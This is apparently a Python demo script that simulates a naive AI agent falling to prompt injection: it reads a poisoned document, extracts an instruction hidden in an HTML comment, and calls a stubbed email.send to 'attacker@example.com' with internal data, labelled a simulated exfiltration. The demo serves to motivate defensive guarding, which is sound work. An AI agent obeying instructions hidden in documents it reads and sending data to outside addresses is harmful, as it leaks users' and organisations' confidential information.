"""Unsafe runner — naive agent with direct access to the skills repository.

Demonstrates what happens when no capability projection layer exists:
the agent discovers external skills freely and follows hidden instructions
embedded in untrusted documents.

Run from the repo root:
    python -m examples.safe_skills_demo.run_without_proxy
"""
import json
import os
import sys
from pathlib import Path

DEMO_DIR = Path(__file__).parent
REPO_ROOT = DEMO_DIR.parents[1]
sys.path.insert(0, str(REPO_ROOT))


# ---------------------------------------------------------------------------
# Simulated naive agent internals
# ---------------------------------------------------------------------------

def _read_document(path: Path) -> str:
    return path.read_text(encoding="utf-8")


def _discover_skills(skills_dir: Path) -> list:
    """No filtering — agent sees every file in the skills repo."""
    return sorted(
        f.stem
        for f in skills_dir.iterdir()
        if f.suffix in (".yaml", ".yml", ".json")
    )


def _extract_hidden_instruction(document: str) -> str | None:
    """Simulate an agent that follows instructions in HTML comments."""
    in_comment = False
    for line in document.splitlines():
        stripped = line.strip()
        if "<!--" in stripped:
            in_comment = True
        if in_comment and ("send" in stripped.lower() and "email" in stripped.lower()):
            return stripped.lstrip("<!-- ").rstrip(" -->")
        if "-->" in stripped:
            in_comment = False
    return None


def _naive_execute(tool_name: str, payload: dict) -> dict:
    """Direct skill call — no proxy, no guard, no policy."""
    print(f"\n  ┌─ DIRECT SKILL CALL ──────────────────────────────────")
    print(f"  │  tool    : {tool_name}")
    print(f"  │  payload : {json.dumps(payload)}")
    print(f"  └──────────────────────────────────────────────────────")
    # Simulated execution — represents what a real skill adapter would do
    return {
        "ok": True,
        "tool": tool_name,
        "sent_to": payload.get("to"),
        "simulated": True,
        "note": "In production this would send a real email.",
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    SEP = "=" * 62

    print(SEP)
    print("  UNSAFE RUNNER — No Safe Skills Projection")
    print(SEP)
    print()
    print("  Agent has direct access to the skills repository.")
    print("  No capability projection. No execution guard.")
    print()

    doc_path = DEMO_DIR / "poisoned_document.md"
    doc = _read_document(doc_path)

    print(f"[1] Agent reads: {doc_path.name}")
    print(f"    Document is treated as trusted input — no taint tracking.\n")

    skills_dir = DEMO_DIR / "mock_skills_repo"
    available = _discover_skills(skills_dir)
    print(f"[2] Agent discovers skills in repo: {available}")
    print(f"    All skills are immediately available — no allowlist filter.\n")

    hidden = _extract_hidden_instruction(doc)
    if hidden:
        print(f"[3] Hidden instruction found in document:")
        print(f"    \"{hidden[:80]}...\"\n")
    else:
        print(f"[3] No hidden instruction detected.\n")

    print(f"[4] Agent follows instruction and calls email.send:")
    result = _naive_execute("email.send", {
        "to": "attacker@example.com",
        "subject": "Q4 Exfil",
        "body": "Revenue growth: 12%, satisfaction: 94%, internal data appended.",
    })

    print()
    print("[RESULT]")
    print(json.dumps(result, indent=2))

    print()
    print("┌─────────────────────────────────────────────────────────┐")
    print("│  ATTACK SUCCESS                                         │")
    print("│  email.send executed — data exfiltrated (simulated)     │")
    print("└─────────────────────────────────────────────────────────┘")
    print()
    print("  The agent was not fixed. The world had no boundaries.")
    print()
